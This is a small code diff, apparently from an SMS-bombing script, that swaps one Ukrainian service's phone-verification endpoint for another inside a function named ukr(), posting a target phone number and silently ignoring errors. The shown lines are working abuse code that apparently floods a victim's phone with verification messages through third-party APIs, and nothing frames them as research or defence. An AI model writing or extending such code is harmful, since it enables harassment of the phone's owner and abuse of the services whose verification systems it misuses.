@@ -53,7 +53,7 @@ def ukr():
                 except:
                         pass
                 try:
-                         requests.post("https://back.zecredit.com.ua/v1/api/rest/verifications", json={"phone": number}, headers=headers)
+                         requests.post("https://auth.easypay.ua/api/check", json={"phone": "+" + number}, headers=headers)
                 except:
                         pass
 
